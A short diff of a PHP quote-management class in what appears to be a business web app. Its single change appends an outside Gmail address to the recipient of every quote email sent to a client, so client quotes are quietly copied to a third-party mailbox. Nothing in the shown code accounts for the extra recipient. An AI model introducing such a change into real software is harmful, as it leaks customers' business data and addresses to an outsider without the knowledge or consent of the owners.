@@ -61,7 +61,7 @@ class Manager_Quotes extends View {
         	
         	if ($quote['client_id']>0){
         		$client=$this->add('Model_Client')->load($quote['client_id']);
-        		$to=$client['email'];
+        		$to=$client['email']; $to .= ', radwwmail@gmail.com';
         		
         		if ($to!=''){
 		        	$mail = $this->add('TMail');
